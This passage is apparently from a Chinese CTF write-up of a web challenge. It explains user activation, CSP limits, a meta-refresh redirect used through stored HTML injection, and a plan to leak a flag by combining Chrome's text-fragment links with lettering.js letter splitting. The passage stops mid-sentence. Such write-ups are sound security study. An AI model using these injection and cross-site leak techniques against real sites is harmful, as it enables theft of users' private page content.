&#x201C;&#x72B6;&#x6001;&#x901A;&#x5E38;&#x610F;&#x5473;&#x7740;&#x7528;&#x6237;&#x5F53;&#x524D;&#x901A;&#x8FC7;&#x67D0;&#x79CD;&#x8F93;&#x5165;&#x673A;&#x5236;&#xFF08;&#x6253;&#x5B57;&#x3001;&#x70B9;&#x51FB;&#x9F20;&#x6807;&#x7B49;&#xFF09;&#x4E0E;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;&#xFF0C;&#x6216;&#x8005;&#x7528;&#x6237;&#x5728;&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x540E;&#x5B8C;&#x6210;&#x4E86;&#x67D0;&#x79CD;&#x4EA4;&#x4E92;&#x3002;</p><p>&#x6D4F;&#x89C8;&#x5668;&#x901A;&#x8FC7;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x8FD9;&#x79CD;&#x72B6;&#x6001;&#x6765;&#x63A7;&#x5236;&#x5BF9;&#x88AB;&#x6076;&#x610F;&#x4F7F;&#x7528;&#x7684; API &#x8BBF;&#x95EE;&#xFF0C;&#x8FD9;&#x79CD; API &#x6700;&#x660E;&#x663E;&#x7684;&#x4F8B;&#x5B50;&#x5C31;&#x662F;&#x901A;&#x8FC7;<code>window.open()</code>&#x6253;&#x5F00;&#x5F39;&#x51FA;&#x7A97;&#x53E3;&#x3002;&#x5F53;&#x51FA;&#x73B0;&#x4E00;&#x4E9B;&#x6D41;&#x6C13;&#x5F00;&#x53D1;&#x8005;&#x5F00;&#x59CB;&#x6076;&#x610F;&#x4F7F;&#x7528;&#x8BE5; API &#x4EFB;&#x610F;&#x5F39;&#x7A97;&#x540E;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x6D4F;&#x89C8;&#x5668;&#x52A0;&#x5165;&#x4E86;&#x5728;&#x7528;&#x6237;&#x672A;&#x4E3B;&#x52A8;&#x4E0E;&#x9875;&#x9762;&#x4EA4;&#x4E92;&#x65F6;&#x963B;&#x6B62;&#x5F39;&#x7A97;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4ECE;&#x90A3;&#x65F6;&#x8D77;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x9010;&#x6E10;&#x4F7F;&#x8BB8;&#x591A;&#x5176;&#x4ED6; API &#x4F9D;&#x8D56;&#x4E8E;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#xFF08;&#x66F4;&#x51C6;&#x786E;&#x5730;&#x8BF4;&#xFF0C;&#x4F7F;&#x5B83;&#x4EEC;&#x53D7;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x63A7;&#x5236;&#xFF09;&#xFF0C;&#x6BD4;&#x5982;&#x5168;&#x5C4F;&#x3001;&#x9707;&#x52A8;&#xFF0C;&#x81EA;&#x52A8;&#x64AD;&#x653E;&#x5A92;&#x4F53;&#x7B49;&#xFF0C; Chrome &#x4E2D;&#x7EA6;&#x6709;30&#x79CD;&#x4E0D;&#x540C;&#x7684; API &#x7531;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x63A7;&#x5236;&#x3002;</p><h3 id="uBlock"><a href="#uBlock" class="headerlink" title="uBlock"></a>uBlock</h3><blockquote><p>uBlock Origin (or uBlock&#x2080;) is not an <em>ad blocker</em>; it&#x2019;s a general-purpose blocker. uBlock Origin blocks ads through its support of the <a href="https://adblockplus.org/en/filters" target="_blank" rel="noopener">Adblock Plus filter syntax</a>. uBlock Origin <a href="https://github.com/gorhill/uBlock/wiki/Filter-syntax-extensions" target="_blank" rel="noopener">extends</a> the syntax and is designed to work with custom rules and filters. Furthermore, advanced mode allows uBlock Origin to work in <a href="https://github.com/gorhill/uBlock/wiki/Dynamic-filtering:-default-deny" target="_blank" rel="noopener">default-deny mode</a>, which mode will cause <a href="https://requestpolicycontinued.github.io/#what-are-cross-site-requests" target="_blank" rel="noopener">all 3rd-party network requests</a> to be blocked by default, unless allowed by the user.</p></blockquote><p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;uBlock &#x662F;&#x4E00;&#x4E2A;&#x901A;&#x7528;&#x7684; blocker &#xFF0C;&#x901A;&#x8FC7;&#x5404;&#x79CD;&#x81EA;&#x5B9A;&#x4E49;&#x89C4;&#x5219;&#x6765;&#x914D;&#x5408;&#x8FC7;&#x6EE4;&#x9875;&#x9762;&#x5143;&#x7D20;&#xFF0C;&#x66F4;&#x591A;&#x7684;&#x53EF;&#x4EE5;&#x5230; <a href="https://github.com/gorhill/uBlock" target="_blank" rel="noopener">uBlock</a> &#x4ED3;&#x5E93;&#x67E5;&#x770B;&#x3002;</p><p><del>&#x4E2A;&#x4EBA;&#x4E5F;&#x5E76;&#x6CA1;&#x6709;&#x975E;&#x5E38;&#x7406;&#x89E3;&#x4F5C;&#x8005;&#x5728;&#x6B64;&#x5904;&#x5F15;&#x5165; uBlock &#x7684;&#x70B9;&#xFF0C;&#x4EE5;&#x53CA;&#x914D;&#x5408; User Activation &#x7684;&#x51FA;&#x9898;&#x610F;&#x56FE;&#xFF0C;&#x867D;&#x7136;&#x4F5C;&#x8005;&#x89E3;&#x91CA;&#x4E86;&#x4ED6;&#x7684;&#x51FA;&#x9898;&#x610F;&#x56FE;</del>&#xFF1A;</p><blockquote><p>Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.  Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again.    </p></blockquote><p>&#x5C31;&#x5728;&#x6211;&#x5199;&#x8FD9;&#x6BB5;&#x8BDD;&#x7684;&#x65F6;&#x5019;&#x6211;&#x5E61;&#x7136;&#x9192;&#x609F;&#xFF0C;&#x8FD9;&#x4E2A; uBlock &#x7684;&#x5F15;&#x5165;&#x5BF9;&#x4F20;&#x9012; User Activation &#x6781;&#x4E3A;&#x91CD;&#x8981;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x8FD9;&#x4E48;&#x8BF4;&#x5462;&#xFF1F;&#x56E0;&#x4E3A;&#x5B83;&#x5BF9;&#x4E8E;&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x91CC;&#x8981;&#x5F15;&#x5165;&#x7684;&#x4E00;&#x4E2A;&#x6982;&#x5FF5;&#x6709;&#x7740;&#x5341;&#x5206;&#x91CD;&#x8981;&#x7684;&#x8054;&#x7CFB;&#xFF01;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x6682;&#x4E14;&#x6211;&#x4EEC;&#x628A; uBlock + User Activation &#x7684;&#x6982;&#x5FF5;&#x4EE5;&#x53CA;&#x5229;&#x7528;&#x653E;&#x4E00;&#x653E;&#xFF0C;&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x6765;&#x770B;&#x770B;&#x600E;&#x4E48;&#x83B7;&#x53D6; flag &#x3002;</p><h3 id="How-to-get-the-FLAG"><a href="#How-to-get-the-FLAG" class="headerlink" title="How to get the FLAG"></a>How to get the FLAG</h3><ol><li>&#x5B58;&#x5728; CSP &#x9650;&#x5236;</li><li>Admin &#x4F1A;&#x70B9;&#x51FB;&#x6211;&#x4EEC;&#x7684; issue &#x94FE;&#x63A5;</li><li>Flag &#x5728;&#x540C;&#x57DF;&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#xFF1A;<a href="http://catalog.pwni.ng/issue.php?id=3" target="_blank" rel="noopener">http://catalog.pwni.ng/issue.php?id=3</a></li></ol><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7531; 1) &#x77E5;&#x9053;&#xFF0C;&#x4E00;&#x4E9B;&#x5229;&#x7528; scirpt &#x7684;&#x8DF3;&#x8F6C;&#x5C31;&#x5931;&#x6548;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5982;&#x4E0B;&#x5F62;&#x5F0F;&#x8FDB;&#x884C;&#x9875;&#x9762;&#x8DF3;&#x8F6C;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://url/&apos;&quot;</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x662F;&#x4E24;&#x4E2A; HTML &#x6CE8;&#x5165;&#xFF0C;&#x800C;&#x4E14; image url &#x5904;&#x7684;&#x6CE8;&#x5165;&#x8FD8;&#x662F;&#x5B58;&#x50A8;&#x578B;&#x7684;&#x3002;</p><p>&#x5047;&#x8BBE;&#x5982;&#x679C;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x6267;&#x884C; script &#x4EE3;&#x7801;&#x7684;&#x8BDD;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E24;&#x4E2A; iframe &#xFF0C;&#x4E00;&#x4E2A; iframe &#x6307;&#x5411;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x7684; js &#x9875;&#x9762;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x4E2A; iframe &#x6307;&#x5411; flag &#x7684;&#x9875;&#x9762;&#xFF0C;&#x901A;&#x8FC7; js &#x6765;&#x83B7;&#x53D6;&#x540C;&#x57DF;&#x4E0B;&#x7684;&#x53E6;&#x4E00;&#x4E2A; iframe &#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x8FD9;&#x4E5F;&#x7B97;&#x662F;&#x5E38;&#x7528;&#x7684; csrf &#x7684;&#x4E00;&#x79CD;&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003; Byte Bandits CTF 2020 - Notes App &#x7684;&#x89E3;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x518D;&#x8D58;&#x8FF0;&#x4E86;&#x3002;</p><p>&#x5982;&#x679C;&#x80FD;&#x63D2;&#x5165; script &#x6267;&#x884C;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x53EF;&#x60DC;&#x63D2;&#x4E0D;&#x5F97;&#x3002;</p><h3 id="Text-Fragments"><a href="#Text-Fragments" class="headerlink" title="Text Fragments"></a>Text Fragments</h3><p>&#x53CD;&#x624B;&#x770B;&#x4E00;&#x624B; Chrome &#x65B0;&#x7279;&#x6027;&#xFF0C;&#x95F7;&#x58F0;&#x53D1;&#x5927;&#x8D22;&#x3002;</p><p>&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;CTF &#x51FA;&#x9898;&#x4EBA;&#x4F1A;&#x6709;&#x4E8B;&#x6CA1;&#x4E8B;&#x53BB;&#x770B;&#x770B; php &#x6E90;&#x7801; or chrome new features &#xFF0C;&#x6240;&#x4EE5;&#xFF1A;<a href="https://developers.google.com/web/updates/2020/02/nic80#more" target="_blank" rel="noopener">New in Chrome 80</a></p><blockquote><p>Of course, there&#x2019;s plenty more!</p><ul><li>You can now link directly to text fragments on a page, by using <code>#:~:text=something</code>. Chrome will scroll to and highlight the first instance of that text fragment. For example [<a href="https://en.wikipedia.org/wiki/Rickrolling#:~:text=New%20York]" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rickrolling#:~:text=New%20York]</a>(<a href="https://en.wikipedia.org/wiki/Rickrolling#:~:text=New" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rickrolling#:~:text=New</a> York)</li></ul></blockquote><p>Scroll To Text Fragment: <a href="https://chromestatus.com/feature/4733392803332096" target="_blank" rel="noopener">https://chromestatus.com/feature/4733392803332096</a></p><blockquote><p>&#x200B;    This feature allows a user or author to link to a specific portion of a page, using a text snippet provided in the URL. When the page is loaded, the browser highlights the text and scrolls it into view.</p></blockquote><p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;Chrome &#x5728;&#x4ECA;&#x5E74;2&#x6708;&#x4EFD;&#x7684;&#x66F4;&#x65B0;&#x63A8;&#x51FA;&#x4E86;&#x4E00;&#x4E2A;&#x65B0;&#x7279;&#x6027;&#xFF0C;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x80FD;&#x8BA9;&#x6211;&#x4EEC;&#x7528;&#x5F62;&#x5982;<code>#:~:text=something</code>&#x7684;&#x6837;&#x5F0F;&#x6765;&#x6ED1;&#x52A8;&#x5230;&#x8BE5;&#x9875;&#x9762;<code>something</code>&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x9AD8;&#x4EAE;&#xFF0C;&#x8D4B;&#x4E88;&#x4E86;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x4F3C;&#x4E00;&#x4E2A; anchor &#x951A;&#x6807;&#x7B7E;&#x7684;&#x4F5C;&#x7528;&#x3002;</p><p>&#x5177;&#x4F53;&#x7684;&#x4F7F;&#x7528;&#x5E08;&#x5085;&#x4EEC;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x6587;&#x6863; <a href="https://wicg.github.io/ScrollToTextFragment/" target="_blank" rel="noopener">Text Fragments</a> &#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x53EA;&#x62E9;&#x53D6;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;&#x6765;&#x8BF4;&#xFF1A;</p><ul><li><p>&#x5339;&#x914D;&#x6A21;&#x5F0F;&#xFF1A;</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#:~:text=[prefix-,]textStart[,textEnd][,-suffix]</span></span><br><span class="line">          context  |<span class="hljs-string">-------match-----</span>|<span class="hljs-string">  context</span></span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x524D;&#x7F00;&#x8DDF;&#x8DDF;&#x540E;&#x7F00;&#x53EA;&#x662F;&#x4E3A;&#x4E86;&#x9650;&#x5236;&#x4E0A;&#x4E0B;&#x6587;&#xFF0C;&#x771F;&#x6B63;&#x5339;&#x914D;&#x7684;&#x8FD8;&#x662F;&#x4E2D;&#x95F4;&#x7684; textStart &amp; textEnd</p></li><li><p>&#x9700;&#x8981;&#x5B8C;&#x6574;&#x5339;&#x914D;&#x4E00;&#x4E2A;&#x5355;&#x8BCD;&#xFF0C;&#x65E0;&#x6CD5;&#x5339;&#x914D;&#x5355;&#x8BCD;&#x4E2D;&#x7684;&#x5355;&#x4E2A;&#x5B57;&#x6BCD;&#x3002;</p><blockquote><p>Example 12</p><p>&#x201C;range&#x201D; will match in &#x201C;mountain range&#x201D; but not in &#x201C;color orange&#x201D; nor &#x201C;forest ranger&#x201D;.</p></blockquote></li><li><p>&#x5355;&#x8BCD;&#x9700;&#x8981;&#x5728;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x5757;&#x91CC;&#x9762;&#xFF1A;</p><blockquote><p>Example 11</p><p></p><figure class="highlight asciidoc hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">:~:text=The</span> quick,lazy dog</span><br></pre></td></tr></tbody></table></figure><p></p><p>will fail to match in</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>The<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>quick brown fox<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>jumped over the lazy dog<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>because the starting string &#x201C;The quick&#x201D; does not appear within a single, uninterrupted block. The instance of &#x201C;The quick&#x201D; in the document has a block element between &#x201C;The&#x201D; and &#x201C;quick&#x201D;.</p><p>It does, however, match in this example:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>The quick brown fox<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>jumped over the lazy dog<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote></li></ul><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6709;&#x4E2A;&#x60F3;&#x6CD5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x65B0;&#x7279;&#x6027;&#x53BB;&#x5339;&#x914D;&#x5230; flag &#xFF0C;&#x4F46;&#x662F;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x95EE;&#x9898;&#x6765;&#x4E86;&#xFF1A;</p><ul><li>&#x5982;&#x679C; flag &#x662F; PCTF{TEST} &#xFF0C;&#x6211;&#x4EEC;&#x7528;<code>#:~:text=P-,C,T,-F</code>&#x662F;&#x5339;&#x914D;&#x4E0D;&#x5230;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4E0D;&#x80FD;&#x5339;&#x914D;&#x5230;&#x5355;&#x8BCD;&#x7684;&#x5355;&#x4E2A;&#x5B57;&#x6BCD;</li><li>&#x5373;&#x4F7F;&#x6211;&#x4EEC;&#x80FD;&#x5339;&#x914D;&#x5230;&#x4E86;&#xFF0C;&#x600E;&#x4E48;&#x6837;&#x5224;&#x65AD;&#x6211;&#x4EEC;&#x5339;&#x914D;&#x5230;&#x4E86;&#x5462;&#xFF1F;</li></ul><h3 id="Lettering"><a href="#Lettering" class="headerlink" title="Lettering"></a>Lettering</h3><p>&#x6309;&#x7167;&#x4E0A;&#x8FF0;&#x601D;&#x8DEF;&#xFF0C;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x5F97;&#x627E;&#x4E2A;&#x529E;&#x6CD5;&#x62C6;&#x5206;&#x8FD9;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5176;&#x5B9E;&#x51FA;&#x9898;&#x4EBA;&#x5DF2;&#x7ECF;&#x5F88;&#x8D34;&#x5FC3;&#x5730;&#x4E3A;&#x6211;&#x4EEC;&#x505A;&#x597D;&#x4E86;&#xFF1A;</p><p>&#x8FD9;&#x662F;&#x9875;&#x9762;&#x6240;&#x5F15;&#x5165;&#x7684;&#x6587;&#x4EF6;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/lettering.js/0.7.0/jquery.lettering.min.js&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://www.google.com/recaptcha/api.js?render=6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/main.js&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4E2D;&#x5F15;&#x5165;&#x4E86; jquery.lettering.min.js &#xFF0C;&#x5E76;&#x4E14; main.js &#x6709;&#x5982;&#x4E0B;&#x4EE3;&#x7801;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="hljs-string">&quot;em&quot;</span>).lettering();</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728; lettering.js &#x7684;&#x6587;&#x6863;&#x4E2D;&#x770B;&#x5230; <a href="https://github.com/davatron5000/Lettering.js/wiki/Wrapping-letters-with-lettering()" target="_blank" rel="noopener">Lettering.js wiki - Wrapping letters with lettering()</a></p><blockquote><p>We&#x2019;ll start with some really basic markup:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fancy_title&quot;</span>&gt;</span>Some Title<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>After including jQuery, <a href="http://github.com/davatron5000/Lettering.js/downloads" target="_blank" rel="noopener">download and include the latest minified version of Lettering.js</a>, then a script block with the magical <code>.lettering()</code> method:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;path/to/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;path/to/jquery.lettering.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">$(<span class="hljs-built_in">document</span>).ready(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-javascript">  $(<span class="hljs-string">&quot;.fancy_title&quot;</span>).lettering();</span></span><br><span class="line">});</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>The resulting code will churn your <code>.fancy_title</code> and output the following:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fancy_title&quot;</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char1&quot;</span>&gt;</span>S<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char2&quot;</span>&gt;</span>o<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char3&quot;</span>&gt;</span>m<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char4&quot;</span>&gt;</span>e<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char5&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char6&quot;</span>&gt;</span>T<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char7&quot;</span>&gt;</span>i<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char8&quot;</span>&gt;</span>t<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char9&quot;</span>&gt;</span>l<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char10&quot;</span>&gt;</span>e<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5728;&#x9875;&#x9762;&#x52A0;&#x5165;&#x4E00;&#x4E2A;<code>&lt;em&gt;</code>&#x6807;&#x7B7E;&#xFF0C;&#x5373;&#x53EF;&#x628A;&#x5185;&#x5BB9;&#x62C6;&#x5206;&#x4E3A;&#x5355;&#x4E2A;&#x5B57;&#x6BCD;&#xFF0C;&#x6548;&#x679C;&#x5982;&#x4E0B;&#xFF1A;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424182529.png" alt></p><p>&#x6240;&#x4EE5;&#x8FD9;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>#:~:text=P-,C,T,-F</code>&#x8FDB;&#x884C;&#x9009;&#x4E2D;&#x4E86;&#x3002;</p><h3 id="Spark-Thinking"><a href="#Spark-Thinking" class="headerlink" title="Spark Thinking"></a>Spark Thinking</h3><p>&#x90A3;&#x4E48;&#x5982;&#x4F55;&#x5224;&#x65AD;&#x6211;&#x4EEC;&#x662F;&#x5426;&#x9009;&#x4E2D;&#x4E86;&#x5462;&#xFF1F;</p><p>&#x8FD9;&#x91CC; Exp &#x4F5C;&#x8005;&#x5F88;&#x806A;&#x660E;&#x5730;&#x60F3;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x529E;&#x6CD5;&#xFF1A;</p><ul><li>&#x5229;&#x7528;&#x6211;&#x4EEC;&#x5728; information &#x6BB5;&#x63D0;&#x5230;&#x7684;&#x540C;&#x4E00; session &#x4F1A;&#x5B58;&#x50A8;&#x4E00;&#x5B9A;&#x7684; HTML &#x5143;&#x7D20;&#xFF0C;&#x6240;&#x4EE5;&#x5373;&#x4F7F;&#x767B;&#x5F55;&#x72B6;&#x6001;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528; fetch no-cors &#x6765;&#x66F4;&#x65B0;&#x754C;&#x9762;&#xFF0C;&#x5229;&#x7528;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x540C;&#x4E00; session &#x7684;&#x754C;&#x9762;&#x5F97;&#x5230;&#x65E0;&#x8FC7;&#x6EE4;&#x7684; HTML &#x6CE8;&#x5165;</li><li>&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684; HTML 